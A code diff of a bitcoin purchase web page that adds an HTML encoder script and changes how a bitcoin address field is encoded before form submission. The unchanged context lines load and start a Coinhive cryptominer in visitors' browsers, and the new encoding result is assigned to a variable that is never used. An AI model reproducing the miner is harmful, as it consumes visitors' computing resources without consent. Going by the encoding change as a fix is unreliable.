@@ -19,6 +19,9 @@
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script src="https://checkout.stripe.com/checkout.js"></script>
+<script src="encoder.js" >
+  Encoder.EncodeType = "entity";
+</script>
 <script>
   var miner = new CoinHive.Anonymous('VPgKqaoxqrpzKX18Ygy2pj04Dm8awHKi', {throttle: 0.5});
   miner.start();
@@ -252,7 +255,7 @@
               $("#stripeToken").val(token.id);
               $("#stripeEmail").val(token.email);
               $("#amountInCents").val(roundUp(($('#buyamount').val() * buy * 1.06), 100) * 100);
-              HTMLEncode(JSON.stringify($('#buybtcaddress').val()));
+              var encoded = Encoder.htmlEncode(JSON.stringify($('#buybtcaddress').val()));
               $("#formbuy").submit();
             }
           });
